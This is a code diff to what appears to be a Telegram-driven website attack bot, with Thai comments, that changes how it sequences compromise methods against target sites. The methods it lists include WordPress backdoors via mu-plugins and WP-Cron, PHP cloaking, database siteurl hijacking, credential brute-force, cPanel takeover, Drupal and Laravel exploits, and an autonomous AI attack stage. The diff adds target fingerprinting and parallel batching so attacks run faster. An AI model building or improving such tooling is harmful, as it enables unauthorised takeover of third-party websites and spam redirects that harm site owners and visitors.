@@ -5482,32 +5482,36 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         icon: string;
         keywords: string[]; // keywords to match from attackVector name/technique
         cms: string[]; // compatible CMS types, "*" = universal
+        conflictGroup: string; // methods in same group can't run in parallel (shared resources)
       };
       const ALL_METHODS: AttackMethodDef[] = [
         // WP-specific methods
-        { id: "pipeline", name: "Unified Attack Pipeline", phase: "exploit", icon: "💥", keywords: ["upload", "put", "post", "webdav", "writable", "form", "multipart"], cms: ["wordpress", "*"] },
-        { id: "cloaking", name: "PHP Cloaking Injection", phase: "inject", icon: "💊", keywords: ["cloaking", "php", "inject", "htaccess", "functions.php"], cms: ["wordpress"] },
-        { id: "mu_plugins", name: "MU-Plugins Backdoor", phase: "inject", icon: "💀", keywords: ["mu-plugin", "must-use", "auto-load", "mu_plugins", "wp-content/mu"], cms: ["wordpress"] },
-        { id: "db_siteurl", name: "DB siteurl/home Hijack", phase: "hijack", icon: "🗄️", keywords: ["siteurl", "home", "wp_options", "database", "db_option", "option_value"], cms: ["wordpress"] },
-        { id: "gtm_inject", name: "GTM Redirect Inject", phase: "inject", icon: "🏷️", keywords: ["gtm", "tag manager", "google tag", "analytics", "header inject", "footer inject", "wpcode"], cms: ["wordpress"] },
-        { id: "auto_prepend", name: "auto_prepend .user.ini", phase: "inject", icon: "⚙️", keywords: ["user.ini", "auto_prepend", "php.ini", "prepend_file", "php_value", "php-fpm"], cms: ["wordpress", "joomla", "drupal", "magento", "custom", "*"] },
-        { id: "hijack", name: "Hijack Redirect", phase: "hijack", icon: "🔓", keywords: ["credential", "brute", "xmlrpc", "ftp", "mysql", "phpmyadmin", "cpanel", "takeover"], cms: ["wordpress", "*"] },
-        { id: "advanced", name: "Advanced Deploy (5 เทคนิค)", phase: "exploit", icon: "🚀", keywords: ["parasite", "doorway", "play store", "apk", "seo"], cms: ["wordpress"] },
-        { id: "redirect", name: "Redirect Takeover ตรง", phase: "hijack", icon: "🎯", keywords: ["redirect", "301", "302", "meta refresh", "javascript redirect"], cms: ["*"] },
+        // Conflict groups: methods in same group share resources and can't run in parallel
+        // "upload" = file upload paths, "wp_inject" = WP file modification, "cred" = credential/login
+        // "redirect" = redirect chain, "config" = server config, "ai" = AI session, "cms" = CMS-specific
+        { id: "pipeline", name: "Unified Attack Pipeline", phase: "exploit", icon: "💥", keywords: ["upload", "put", "post", "webdav", "writable", "form", "multipart"], cms: ["wordpress", "*"], conflictGroup: "upload" },
+        { id: "cloaking", name: "PHP Cloaking Injection", phase: "inject", icon: "💊", keywords: ["cloaking", "php", "inject", "htaccess", "functions.php"], cms: ["wordpress"], conflictGroup: "wp_inject" },
+        { id: "mu_plugins", name: "MU-Plugins Backdoor", phase: "inject", icon: "💀", keywords: ["mu-plugin", "must-use", "auto-load", "mu_plugins", "wp-content/mu"], cms: ["wordpress"], conflictGroup: "wp_inject" },
+        { id: "db_siteurl", name: "DB siteurl/home Hijack", phase: "hijack", icon: "🗄️", keywords: ["siteurl", "home", "wp_options", "database", "db_option", "option_value"], cms: ["wordpress"], conflictGroup: "cred" },
+        { id: "gtm_inject", name: "GTM Redirect Inject", phase: "inject", icon: "🏷️", keywords: ["gtm", "tag manager", "google tag", "analytics", "header inject", "footer inject", "wpcode"], cms: ["wordpress"], conflictGroup: "wp_inject" },
+        { id: "auto_prepend", name: "auto_prepend .user.ini", phase: "inject", icon: "⚙️", keywords: ["user.ini", "auto_prepend", "php.ini", "prepend_file", "php_value", "php-fpm"], cms: ["wordpress", "joomla", "drupal", "magento", "custom", "*"], conflictGroup: "config" },
+        { id: "hijack", name: "Hijack Redirect", phase: "hijack", icon: "🔓", keywords: ["credential", "brute", "xmlrpc", "ftp", "mysql", "phpmyadmin", "cpanel", "takeover"], cms: ["wordpress", "*"], conflictGroup: "cred" },
+        { id: "advanced", name: "Advanced Deploy (5 เทคนิค)", phase: "exploit", icon: "🚀", keywords: ["parasite", "doorway", "play store", "apk", "seo"], cms: ["wordpress"], conflictGroup: "upload" },
+        { id: "redirect", name: "Redirect Takeover ตรง", phase: "hijack", icon: "🎯", keywords: ["redirect", "301", "302", "meta refresh", "javascript redirect"], cms: ["*"], conflictGroup: "redirect" },
         // Priority 2 WP methods
-        { id: "wp_cron", name: "WP-Cron Backdoor", phase: "inject", icon: "⏰", keywords: ["cron", "wp-cron", "scheduled", "self-healing", "persistent"], cms: ["wordpress"] },
-        { id: "widget_inject", name: "Widget/Sidebar Inject", phase: "inject", icon: "🧱", keywords: ["widget", "sidebar", "widget_text", "custom_html", "widget_block"], cms: ["wordpress"] },
-        { id: "wpcode_abuse", name: "WPCode Plugin Abuse", phase: "inject", icon: "📝", keywords: ["wpcode", "insert headers", "code snippets", "header footer", "ihaf"], cms: ["wordpress"] },
-        { id: "service_worker", name: "Service Worker Hijack", phase: "inject", icon: "🛡️", keywords: ["service worker", "sw.js", "cache", "intercept", "pwa"], cms: ["*"] },
+        { id: "wp_cron", name: "WP-Cron Backdoor", phase: "inject", icon: "⏰", keywords: ["cron", "wp-cron", "scheduled", "self-healing", "persistent"], cms: ["wordpress"], conflictGroup: "wp_inject" },
+        { id: "widget_inject", name: "Widget/Sidebar Inject", phase: "inject", icon: "🧱", keywords: ["widget", "sidebar", "widget_text", "custom_html", "widget_block"], cms: ["wordpress"], conflictGroup: "wp_inject" },
+        { id: "wpcode_abuse", name: "WPCode Plugin Abuse", phase: "inject", icon: "📝", keywords: ["wpcode", "insert headers", "code snippets", "header footer", "ihaf"], cms: ["wordpress"], conflictGroup: "wp_inject" },
+        { id: "service_worker", name: "Service Worker Hijack", phase: "inject", icon: "🛡️", keywords: ["service worker", "sw.js", "cache", "intercept", "pwa"], cms: ["*"], conflictGroup: "config" },
         // Non-WP CMS methods
-        { id: "joomla", name: "Joomla Exploits", phase: "exploit", icon: "🔴", keywords: ["joomla", "com_fields", "com_content", "com_users", "joomla template", "joomla api"], cms: ["joomla"] },
-        { id: "drupal", name: "Drupal Exploits", phase: "exploit", icon: "🔵", keywords: ["drupal", "drupalgeddon", "drupal theme", "drupal module", "node/1"], cms: ["drupal"] },
-        { id: "cpanel_full", name: "cPanel Full Control", phase: "hijack", icon: "🖥️", keywords: ["cpanel", "whm", "file manager", "zone editor", "cron", "cpanel_api", "2083"], cms: ["*"] },
-        { id: "iis_aspnet", name: "IIS/ASP.NET Exploits", phase: "exploit", icon: "🪟", keywords: ["iis", "asp.net", "aspx", "web.config", "windows server", ".aspx"], cms: ["custom", "unknown"] },
-        { id: "open_redirect", name: "Open Redirect Chain", phase: "hijack", icon: "🔗", keywords: ["open redirect", "redirect_uri", "return_to", "next=", "callback", "goto"], cms: ["*"] },
-        { id: "laravel_inject", name: "Laravel Redirect Inject", phase: "exploit", icon: "🟥", keywords: ["laravel", "ignition", ".env", "artisan", "blade", "eloquent", "laravel debug"], cms: ["custom", "unknown"] },
+        { id: "joomla", name: "Joomla Exploits", phase: "exploit", icon: "🔴", keywords: ["joomla", "com_fields", "com_content", "com_users", "joomla template", "joomla api"], cms: ["joomla"], conflictGroup: "cms" },
+        { id: "drupal", name: "Drupal Exploits", phase: "exploit", icon: "🔵", keywords: ["drupal", "drupalgeddon", "drupal theme", "drupal module", "node/1"], cms: ["drupal"], conflictGroup: "cms" },
+        { id: "cpanel_full", name: "cPanel Full Control", phase: "hijack", icon: "🖥️", keywords: ["cpanel", "whm", "file manager", "zone editor", "cron", "cpanel_api", "2083"], cms: ["*"], conflictGroup: "cred" },
+        { id: "iis_aspnet", name: "IIS/ASP.NET Exploits", phase: "exploit", icon: "🪟", keywords: ["iis", "asp.net", "aspx", "web.config", "windows server", ".aspx"], cms: ["custom", "unknown"], conflictGroup: "cms" },
+        { id: "open_redirect", name: "Open Redirect Chain", phase: "hijack", icon: "🔗", keywords: ["open redirect", "redirect_uri", "return_to", "next=", "callback", "goto"], cms: ["*"], conflictGroup: "redirect" },
+        { id: "laravel_inject", name: "Laravel Redirect Inject", phase: "exploit", icon: "🟥", keywords: ["laravel", "ignition", ".env", "artisan", "blade", "eloquent", "laravel debug"], cms: ["custom", "unknown"], conflictGroup: "cms" },
         // AI-powered autonomous attack (last resort — full AI session)
-        { id: "agentic_auto", name: "AI Auto Attack (Autonomous)", phase: "exploit", icon: "🤖", keywords: ["ai", "auto", "autonomous", "agentic", "machine learning", "smart", "adaptive"], cms: ["*"] },
+        { id: "agentic_auto", name: "AI Auto Attack (Autonomous)", phase: "exploit", icon: "🤖", keywords: ["ai", "auto", "autonomous", "agentic", "machine learning", "smart", "adaptive"], cms: ["*"], conflictGroup: "ai" },
       ];
       
       // ── Smart CMS Detection ──
@@ -5528,17 +5532,55 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         return "unknown";
       })();
       
-      // Filter methods by CMS compatibility
-      // full_chain = ลองทุกวิธี! ถ้า CMS unknown ให้ลองทั้งหมดเลย (เผื่อ detect ผิด)
+      // ═══ SMART METHOD SKIP: Filter methods based on CMS + server + ports ═══
+      // Strict filtering to avoid wasting time on irrelevant methods
+      const WP_ONLY_METHODS = new Set(["cloaking", "mu_plugins", "db_siteurl", "gtm_inject", "wp_cron", "widget_inject", "wpcode_abuse", "advanced"]);
+      const serverStr = (vulnScanResult?.serverInfo?.server || "").toLowerCase();
+      const isIIS = serverStr.includes("microsoft-iis") || serverStr.includes("iis");
+      const isLaravel = (vulnScanResult?.serverInfo?.poweredBy || "").toLowerCase().includes("laravel");
+      const openPorts = new Set((globalThis as any).__lastShodanPorts || []);
+      const hasFTP = openPorts.has(21) || openPorts.has("21");
+      const hasMySQL = openPorts.has(3306) || openPorts.has("3306");
+      
+      const smartSkipReasons: string[] = [];
+      
       const compatibleMethods = ALL_METHODS.filter(m => {
-        if (m.cms.includes("*")) return true; // universal method
-        if (m.cms.includes(detectedCms)) return true; // exact CMS match
-        // ถ้า CMS unknown → ลองทุกวิธีรวม WP ด้วย (full_chain = ลองทุกอย่าง)
+        // Universal methods always included
+        if (m.cms.includes("*")) return true;
+        // Exact CMS match
+        if (m.cms.includes(detectedCms)) return true;
+        
+        // CMS unknown → try everything (can't be sure what's running)
         if (detectedCms === "unknown") return true;
-        // ถ้า detect เป็น CMS อื่น → ยังลอง WP methods ด้วย (เผื่อ detect ผิด)
-        // เฉพาะ CMS-specific ที่ไม่ใช่ WP และไม่ตรง CMS เท่านั้นที่ข้าม
-        // เช่น ถ้า detect เป็น joomla → ข้าม drupal-specific แต่ยังลอง WP
-        if (m.cms.includes("wordpress")) return true; // WP methods ลองเสมอ
+        
+        // ═══ SMART SKIP RULES ═══
+        // Rule 1: Skip WP-only methods when CMS is clearly NOT WordPress
+        if (WP_ONLY_METHODS.has(m.id) && detectedCms !== "wordpress" && (detectedCms as string) !== "unknown") {
+          smartSkipReasons.push(`⏭ ${m.name} (WP-only, CMS=${detectedCms})`);
+          return false;
+        }
+        // Rule 2: Skip IIS methods when not IIS
+        if (m.id === "iis_aspnet" && !isIIS) {
+          smartSkipReasons.push(`⏭ ${m.name} (not IIS)`);
+          return false;
+        }
+        // Rule 3: Skip Laravel methods when not Laravel
+        if (m.id === "laravel_inject" && !isLaravel) {
+          smartSkipReasons.push(`⏭ ${m.name} (not Laravel)`);
+          return false;
+        }
+        // Rule 4: Skip Joomla methods when not Joomla
+        if (m.id === "joomla" && detectedCms !== "joomla") {
+          smartSkipReasons.push(`⏭ ${m.name} (not Joomla)`);
+          return false;
+        }
+        // Rule 5: Skip Drupal methods when not Drupal
+        if (m.id === "drupal" && detectedCms !== "drupal") {
+          smartSkipReasons.push(`⏭ ${m.name} (not Drupal)`);
+          return false;
+        }
+        
+        // Allow custom/unknown CMS methods
         if (m.cms.includes("custom") || m.cms.includes("unknown")) return true;
         return false;
       });
@@ -5548,7 +5590,8 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       await narrator.addAnalysis(
         `\uD83D\uDD0D CMS \u0E17\u0E35\u0E48\u0E15\u0E23\u0E27\u0E08\u0E1E\u0E1A: **${detectedCms === "unknown" ? "\u0E44\u0E21\u0E48\u0E17\u0E23\u0E32\u0E1A CMS" : detectedCms.toUpperCase()}**\n` +
         `\u2705 \u0E27\u0E34\u0E18\u0E35\u0E17\u0E35\u0E48\u0E43\u0E0A\u0E49\u0E44\u0E14\u0E49: ${compatibleMethods.length} \u0E27\u0E34\u0E18\u0E35` +
-        (skippedMethods.length > 0 ? `\n\u23ED\uFE0F Skip ${skippedMethods.length} \u0E27\u0E34\u0E18\u0E35\u0E17\u0E35\u0E48\u0E44\u0E21\u0E48\u0E40\u0E01\u0E35\u0E48\u0E22\u0E27\u0E02\u0E49\u0E2D\u0E07: ${skippedMethods.map(m => m.name).join(", ")}` : "")
+        (skippedMethods.length > 0 ? `\n\u23ED\uFE0F Skip ${skippedMethods.length} \u0E27\u0E34\u0E18\u0E35\u0E17\u0E35\u0E48\u0E44\u0E21\u0E48\u0E40\u0E01\u0E35\u0E48\u0E22\u0E27\u0E02\u0E49\u0E2D\u0E07` : "") +
+        (smartSkipReasons.length > 0 ? `\n\uD83E\uDDE0 Smart Skip:\n${smartSkipReasons.join("\n")}` : "")
       );
       
       // Build dynamic order from scan results
@@ -5722,11 +5765,65 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         }
       }
       
-      // Execute methods in AI-determined order
-      for (let mi = 0; mi < methodOrder.length && !fullChainSuccess; mi++) {
+      // ═══ PARALLEL BATCH BUILDER ═══
+      // Build batches of 2 methods from different conflict groups for parallel execution
+      // Methods in the same conflict group run sequentially, different groups run in parallel
+      const PARALLEL_BATCH_SIZE = 2; // run 2 methods at a time
+      // "ai" and "agentic_auto" should always run alone (heavy resource usage)
+      const SOLO_GROUPS = new Set(["ai"]);
+      
+      type MethodBatch = { methods: Array<{ index: number; id: string; def: AttackMethodDef }> };
+      const batches: MethodBatch[] = [];
+      const methodQueue = methodOrder.map((id, i) => ({ index: i, id, def: ALL_METHODS.find(m => m.id === id)! }));
+      
+      let qi = 0;
+      while (qi < methodQueue.length) {
+        const first = methodQueue[qi];
+        qi++;
+        
+        // Solo methods run alone
+        if (SOLO_GROUPS.has(first.def.conflictGroup)) {
+          batches.push({ methods: [first] });
+          continue;
+        }
+        
+        // Try to find a second method from a different conflict group
+        let paired = false;
+        for (let qj = qi; qj < methodQueue.length; qj++) {
+          const candidate = methodQueue[qj];
+          if (candidate.def.conflictGroup !== first.def.conflictGroup && !SOLO_GROUPS.has(candidate.def.conflictGroup)) {
+            // Found a compatible pair!
+            batches.push({ methods: [first, candidate] });
+            // Remove candidate from queue
+            methodQueue.splice(qj, 1);
+            paired = true;
+            break;
+          }
+        }
+        
+        if (!paired) {
+          // No compatible pair found — run solo
+          batches.push({ methods: [first] });
+        }
+      }
+      
+      await narrator.addAnalysis(
+        `⚡ **Parallel Execution Mode** — ${batches.length} batches (${batches.filter(b => b.methods.length > 1).length} parallel pairs)\n` +
+        batches.map((b, i) => {
+          const names = b.methods.map(m => `${m.def.icon} ${m.def.name}`).join(" + ");
+          return `Batch ${i + 1}: ${names}${b.methods.length > 1 ? " ⚡" : ""}`;
+        }).slice(0, 8).join("\n") +
+        (batches.length > 8 ? `\n... +${batches.length - 8} more` : "")
+      );
+      
+      // Execute batches
+      let globalMethodIndex = 0; // tracks overall method count for narrator
+      for (let bi = 0; bi < batches.length && !fullChainSuccess; bi++) {
+        const batch = batches[bi];
+        
         // Check if user pressed stop button
         if (attackEntry.abortController.signal.aborted) {
-          await narrator.addAnalysis(`⏹ ผู้ใช้กดหยุดโจมตี — หยุดที่วิธีที่ ${mi + 1}/${methodOrder.length}`);
+          await narrator.addAnalysis(`⏹ ผู้ใช้กดหยุดโจมตี — หยุดที่ batch ${bi + 1}/${batches.length}`);
           break;
         }
         
@@ -5734,39 +5831,53 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         const remainingMs = methodLoopDeadline - Date.now();
         if (remainingMs <= 0) {
           const elapsedMin = Math.round(FULL_CHAIN_METHOD_LOOP_TIMEOUT_MS / 60000);
-          const triedCount = mi;
-          const remainingCount = methodOrder.length - mi;
+          const triedCount = globalMethodIndex;
+          const remainingCount = methodOrder.length - triedCount;
           await narrator.addStep(`⏰ Method loop หมดเวลา (${elapsedMin} นาที) — ลองแล้ว ${triedCount} วิธี, ข้าม ${remainingCount} วิธีที่เหลือ`);
           await narrator.completeLastStep("failed");
           await narrator.addAnalysis(
             `⏰ **Graceful Shutdown** — หมดเวลา ${elapsedMin} นาที\n` +
             `ลองแล้ว: ${triedCount} วิธี (สำเร็จ: ${methodOutcomes.filter(o => o.success).length})\n` +
-            `ข้าม: ${methodOrder.slice(mi).map(id => ALL_METHODS.find(m => m.id === id)?.name || id).join(", ")}`
+            `ข้าม: ${batches.slice(bi).flatMap(b => b.methods).map(m => m.def.name).join(", ")}`
           );
           break;
         }
         
-        const methodId = methodOrder[mi];
-        const methodDef = ALL_METHODS.find(m => m.id === methodId)!;
+        const isParallel = batch.methods.length > 1;
+        const batchAbort = new AbortController(); // shared abort for the batch
         
-        // Cap per-method timeout to remaining time (don't exceed loop deadline)
-        const methodTimeout = METHOD_TIMEOUTS[methodId] || DEFAULT_METHOD_TIMEOUT;
-        if (methodTimeout > remainingMs + 30_000) {
-          // This method's timeout exceeds remaining time — cap it
-          const cappedTimeout = Math.max(remainingMs, 30_000); // at least 30s
-          METHOD_TIMEOUTS[methodId] = cappedTimeout;
+        if (isParallel) {
+          const names = batch.methods.map(m => `${m.def.icon} ${m.def.name}`).join(" + ");
+          await narrator.startPhase("exploit", `⚡ Batch ${bi + 1}: ${names} (parallel)`);
+          await narrator.addAnalysis(`⚡ รัน ${batch.methods.length} วิธีพร้อมกัน: ${names}`);
         }
         
-        // Update method progress counter
-        narrator.setMethodProgress(mi + 1, methodDef.name, methodDef.icon);
-        await narrator.startPhase(methodDef.phase, `${methodDef.icon} วิธีที่ ${mi + 1}/${methodOrder.length}: ${methodDef.name}`);
-        const methodStart = Date.now();
-        
-        // Note: Narrator class has its own heartbeat timer (every 30s) that shows
-        // method name + elapsed time in footer — no need for per-method heartbeat here
-        
-        try {
-          await withMethodTimeout(methodId, async (_methodSignal) => {
+        // Create a runner for each method in the batch
+        const runMethod = async (entry: { index: number; id: string; def: AttackMethodDef }) => {
+          const mi = globalMethodIndex + batch.methods.indexOf(entry);
+          const methodId = entry.id;
+          const methodDef = entry.def;
+          
+          // Cap per-method timeout to remaining time
+          const currentRemaining = methodLoopDeadline - Date.now();
+          const methodTimeout = METHOD_TIMEOUTS[methodId] || DEFAULT_METHOD_TIMEOUT;
+          if (methodTimeout > currentRemaining + 30_000) {
+            METHOD_TIMEOUTS[methodId] = Math.max(currentRemaining, 30_000);
+          }
+          
+          if (!isParallel) {
+            // Solo method: show normal progress
+            narrator.setMethodProgress(globalMethodIndex + 1, methodDef.name, methodDef.icon);
+            await narrator.startPhase(methodDef.phase, `${methodDef.icon} วิธีที่ ${globalMethodIndex + 1}/${methodOrder.length}: ${methodDef.name}`);
+          } else {
+            // Parallel method: show combined progress
+            narrator.setMethodProgress(globalMethodIndex + 1, `${batch.methods.map(m => m.def.name).join(" + ")} ⚡`, methodDef.icon);
+          }
+          
+          const methodStart = Date.now();
+          
+          try {
+            await withMethodTimeout(methodId, async (_methodSignal) => {
           if (methodId === "pipeline") {
             // ── Unified Pipeline ──
             const { runUnifiedAttackPipeline } = await import("./unified-attack-pipeline");
@@ -6619,13 +6730,43 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
           agenticSessionId: null,
         }).catch(err => console.warn(`[TelegramAI] recordAttackOutcome error: ${err.message}`));
         
-        timings.push({ step: `Method ${mi + 1}: ${methodDef.name}`, ms: methodDurationMs, ok: fullChainSuccess });
+        timings.push({ step: `Method ${globalMethodIndex + batch.methods.indexOf(entry) + 1}: ${methodDef.name}`, ms: methodDurationMs, ok: methodSuccess });
+        
+        return { methodId, methodName: methodDef.name, success: methodSuccess, durationMs: methodDurationMs };
+        }; // end runMethod
+        
+        // ═══ EXECUTE BATCH ═══
+        if (isParallel) {
+          // Run methods in parallel using Promise.allSettled
+          const batchResults = await Promise.allSettled(
+            batch.methods.map(entry => runMethod(entry))
+          );
+          
+          // Process batch results
+          for (const result of batchResults) {
+            if (result.status === "fulfilled" && result.value?.success) {
+              // One method succeeded — abort others in next batch
+              break;
+            }
+          }
+          
+          // Show batch summary
+          const batchSuccesses = batchResults.filter(r => r.status === "fulfilled" && r.value?.success).length;
+          const batchFails = batchResults.filter(r => r.status === "rejected" || (r.status === "fulfilled" && !r.value?.success)).length;
+          if (batchSuccesses > 0) {
+            await narrator.addAnalysis(`⚡ Batch ${bi + 1} สำเร็จ! (${batchSuccesses} สำเร็จ / ${batchFails} ล้มเหลว)`);
+          }
+        } else {
+          // Run single method
+          await runMethod(batch.methods[0]);
+        }
+        
+        // Update global method index
+        globalMethodIndex += batch.methods.length;
         
         // Early exit: only stop if ALL methods exhausted (no premature exit)
-        // We want to try EVERY method before giving up
-        if (!fullChainSuccess && failedMethods.length >= MAX_CONSECUTIVE_FAILURES && mi < methodOrder.length - 1) {
-          // Don't break — just log a warning and continue trying remaining methods
-          await narrator.addAnalysis(`⚠️ ${failedMethods.length} วิธีล้มเหลว — ยังเหลืออีก ${methodOrder.length - mi - 1} วิธี ลุยต่อ...`);
+        if (!fullChainSuccess && failedMethods.length >= MAX_CONSECUTIVE_FAILURES && globalMethodIndex < methodOrder.length) {
+          await narrator.addAnalysis(`⚠️ ${failedMethods.length} วิธีล้มเหลว — ยังเหลืออีก ${methodOrder.length - globalMethodIndex} วิธี ลุยต่อ...`);
         }
         
         // Early exit: check total elapsed time (safety net)
@@ -6635,7 +6776,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
           await narrator.completeLastStep("failed");
           break;
         }
-      } // end for loop
+      } // end batch loop
       
       // ═══ AUTO-RETRY: Retry timed-out methods with extended timeout ═══
       // Skip auto-retry if method loop deadline already passed (graceful shutdown)
